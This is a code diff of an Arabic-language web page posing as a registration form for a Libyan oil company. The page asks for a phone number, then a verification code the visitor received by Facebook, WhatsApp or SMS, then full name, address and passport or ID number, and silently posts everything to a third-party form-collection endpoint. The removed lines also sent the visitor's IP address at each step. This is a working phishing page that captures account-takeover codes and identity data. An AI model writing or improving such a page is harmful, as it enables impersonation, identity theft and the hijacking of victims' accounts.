@@ -2,38 +2,56 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل - الشركة الليبية للنفط</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل - شركة الليبية للنفط</title>
   <style>
     body {
       font-family: 'Cairo', sans-serif;
       background: linear-gradient(to bottom, #004c97, #ffffff);
       margin: 0;
-      padding: 30px;
-      text-align: center;
+      padding: 0;
       color: #004c97;
     }
 
-    .card {
-      display: none;
-      background: #fff;
-      padding: 20px;
-      margin: auto;
-      border-radius: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    .container {
       max-width: 400px;
+      margin: auto;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      margin-bottom: 20px;
+      display: none;
     }
 
     .card.active {
       display: block;
     }
 
-    input, button {
-      width: 90%;
+    h3 {
+      color: #004c97;
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      font-weight: bold;
+      color: brown;
+    }
+
+    input, button, select {
+      width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      font-size: 16px;
-      border-radius: 10px;
+      margin-bottom: 15px;
       border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+      box-sizing: border-box;
     }
 
     input::placeholder {
@@ -43,135 +61,122 @@
     button {
       background-color: #004c97;
       color: white;
+      font-weight: bold;
       cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #003b78;
     }
 
     .toast {
-      display: none;
-      margin-top: 10px;
-      background: #fff8dc;
-      padding: 10px;
-      border: 1px solid #daa520;
-      color: #000;
+      position: fixed;
+      top: 30px;
+      right: 20px;
+      background: #d9ecff;
+      padding: 10px 20px;
       border-radius: 10px;
+      color: #004c97;
+      font-weight: bold;
+      display: none;
+      z-index: 999;
+      border: 1px solid #004c97;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <!-- المرحلة 1: إدخال رقم الهاتف -->
+    <div class="card active" id="step1">
+      <h3>سجل الدخول</h3>
+      <label for="phone">رقم الهاتف</label>
+      <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
+      <button onclick="handleStep1()">إرسال رقم التحقق</button>
+    </div>
 
-  <!-- المرحلة 1: الهاتف -->
-  <div class="card active" id="step1">
-    <h3>أدخل رقم هاتفك</h3>
-    <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
-    <button onclick="handleStep1()">تلقي الكود</button>
+    <!-- المرحلة 2: إدخال رقم التحقق -->
+    <div class="card" id="step2">
+      <label for="code">رقم التحقق (وصل عبر فيسبوك أو واتساب أو رسالة نصية)</label>
+      <input type="text" id="code" placeholder="أدخل رقم التحقق هنا">
+      <button onclick="handleStep2()">تأكيد رقم التحقق</button>
+    </div>
+
+    <!-- المرحلة 3: البيانات الإضافية -->
+    <div class="card" id="step3">
+      <h3>معلوماتك الشخصية</h3>
+      <label for="fullname">الاسم بالكامل</label>
+      <input type="text" id="fullname" placeholder="الاسم بالكامل">
+      <label for="address">العنوان</label>
+      <input type="text" id="address" placeholder="العنوان بالتفصيل">
+      <label for="idNumber">رقم جواز السفر أو البطاقة</label>
+      <input type="text" id="idNumber" placeholder="مثال: A123456 أو 1234567">
+      <button onclick="submitAll()">إرسال جميع البيانات</button>
+    </div>
   </div>
 
-  <!-- المرحلة 2: كود -->
-  <div class="card" id="step2">
-    <h3>أدخل كود التأكيد</h3>
-    <input type="text" id="code" placeholder="أدخل الكود هنا">
-    <button onclick="handleStep2()">تأكيد الكود</button>
-    <div class="toast" id="toast">تم إرسال الكود، الرجاء الانتظار...</div>
-  </div>
-
-  <!-- المرحلة 3: البيانات -->
-  <div class="card" id="step3">
-    <h3>بياناتك الشخصية</h3>
-    <input type="text" id="fullname" placeholder="الاسم الكامل">
-    <input type="text" id="address" placeholder="العنوان الكامل">
-    <input type="text" id="idNumber" placeholder="رقم جواز السفر أو البطاقة">
-    <button onclick="submitAll()">إرسال البيانات</button>
-    <div class="toast" id="toast2">جارٍ الإرسال...</div>
-  </div>
+  <!-- نافذة الإشعار -->
+  <div class="toast" id="toast">تأكد أن رقم التحقق الذي أدخلته صحيح أو ستضطر إلى إعادة التسجيل</div>
 
   <script>
-    let ip = "غير متوفر";
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => ip = data.ip);
-
     function isLibyanPhone(number) {
       return /^(091|092|093|094|095)\d{7}$/.test(number);
     }
 
+    function showToast() {
+      const toast = document.getElementById('toast');
+      toast.style.display = 'block';
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, 5000);
+    }
+
     function handleStep1() {
-      const phone = document.getElementById('phone').value.trim();
+      const phone = document.getElementById('phone').value;
       if (!isLibyanPhone(phone)) {
-        alert("يرجى إدخال رقم ليبي صحيح.");
+        alert("يرجى إدخال رقم هاتف ليبي صحيح بدون المقدمة الدولية 218");
         return;
       }
-
-      // إرسال رقم الهاتف
-      const formData = new FormData();
-      formData.append('phone', phone);
-      formData.append('ip_address', ip);
-      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      });
-
       document.getElementById('step1').classList.remove('active');
       document.getElementById('step2').classList.add('active');
     }
 
     function handleStep2() {
-      const code = document.getElementById('code').value.trim();
+      const code = document.getElementById('code').value;
       if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
-        alert("يرجى إدخال كود صحيح (6–8 أحرف أو أرقام)");
+        alert("يرجى إدخال رقم تحقق صالح (6 إلى 8 أحرف أو أرقام)");
         return;
       }
-
-      const phone = document.getElementById('phone').value.trim();
-
-      const formData = new FormData();
-      formData.append('phone', phone);
-      formData.append('code', code);
-      formData.append('ip_address', ip);
-      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-      });
-
-      document.getElementById('toast').style.display = 'block';
-
+      showToast();
       setTimeout(() => {
         document.getElementById('step2').classList.remove('active');
         document.getElementById('step3').classList.add('active');
+        submitAll();
       }, 5000);
     }
 
     function submitAll() {
-      const phone = document.getElementById('phone').value.trim();
-      const code = document.getElementById('code').value.trim();
-      const fullname = document.getElementById('fullname').value.trim();
-      const address = document.getElementById('address').value.trim();
-      const idNumber = document.getElementById('idNumber').value.trim();
-
-      if (!fullname || !address || !idNumber) {
-        alert("يرجى ملء جميع الحقول.");
-        return;
-      }
-
       const formData = new FormData();
-      formData.append('phone', phone);
-      formData.append('code', code);
-      formData.append('fullname', fullname);
-      formData.append('address', address);
-      formData.append('idNumber', idNumber);
-      formData.append('ip_address', ip);
+      formData.append('phone', document.getElementById('phone').value);
+      formData.append('code', document.getElementById('code').value);
+      formData.append('fullname', document.getElementById('fullname').value);
+      formData.append('address', document.getElementById('address').value);
+      formData.append('idNumber', document.getElementById('idNumber').value);
 
       fetch('https://formcarry.com/s/ldfA_DUCDrk', {
         method: 'POST',
         body: formData,
-        headers: { 'Accept': 'application/json' }
+        headers: {
+          'Accept': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('تم الإرسال إلى Formcarry:', data);
+      })
+      .catch(error => {
+        console.error('حدث خطأ أثناء الإرسال:', error);
       });
-
-      document.getElementById('toast2').style.display = 'block';
-      setTimeout(() => {
-        document.getElementById('toast2').innerText = "تم إرسال البيانات بنجاح!";
-      }, 5000);
     }
   </script>
 </body>
